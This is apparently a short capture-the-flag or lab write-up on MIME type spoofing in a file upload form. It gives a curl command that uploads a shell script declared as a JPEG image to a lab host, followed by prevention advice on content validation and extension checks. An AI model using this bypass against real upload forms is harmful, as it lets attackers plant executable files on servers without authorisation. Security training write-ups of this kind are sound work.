# Vulnerability

MIME spoofing is used by attackers to manipulate the MIME (Multipurpose Internet Mail Extensions) type of a file to bypass security controls and potentially execute malicious code.

# Identification

We have a form with an input that allows us to upload files.

# Resolve

open your terminal on do a request
curl -X POST -F "uploaded=@/Users/tpinto-m/Desktop/script.sh;type=image/jpg" -F 'Upload=Upload' 'http://10.11.249.210/?page=upload#'

# Prevent

- Input Sanitization: Sanitize all user inputs, including file names and content
- Content Validation: Inspect the actual contents of uploaded files, not just the declared MIME type
- File Extension Checks: Verify that file extensions match the expected content type
- Use Framework
- Use secured library

# Resources

https://reqbin.com/req/c-dot4w5a2/curl-post-file
